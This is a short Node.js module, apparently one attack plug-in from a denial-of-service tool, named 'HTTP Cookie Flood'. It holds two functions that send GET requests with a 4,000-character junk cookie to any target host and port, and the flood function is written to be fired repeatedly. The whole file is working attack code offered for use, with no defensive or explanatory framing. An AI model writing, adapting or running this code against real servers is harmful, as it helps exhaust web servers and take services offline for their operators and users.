const http = require('http');
const https = require('https');

module.exports = {
    name: 'HTTP Cookie Flood',
    description: 'Requests with large cookies',
    
    execute: async (target, port) => {
        const protocol = port === 443 ? https : http;
        const largeCookie = 'session=' + 'x'.repeat(4000);
        
        return new Promise((resolve, reject) => {
            const req = protocol.request({
                hostname: target,
                port: port,
                path: '/',
                method: 'GET',
                headers: { 'Cookie': largeCookie }
            }, (res) => {
                resolve({ status: res.statusCode, cookieSize: largeCookie.length });
                req.destroy();
            });
            
            req.end();
            req.on('error', reject);
        });
    },
    
    flood: (target, port, callback) => {
        const protocol = port === 443 ? https : http;
        const largeCookie = 'data=' + 'x'.repeat(4000);
        
        const req = protocol.request({
            hostname: target,
            port: port,
            path: '/',
            headers: { 'Cookie': largeCookie }
        }, (res) => {
            res.resume();
            req.destroy();
            callback(true);
        });
        
        req.end();
        req.on('error', () => callback(false));
    }
};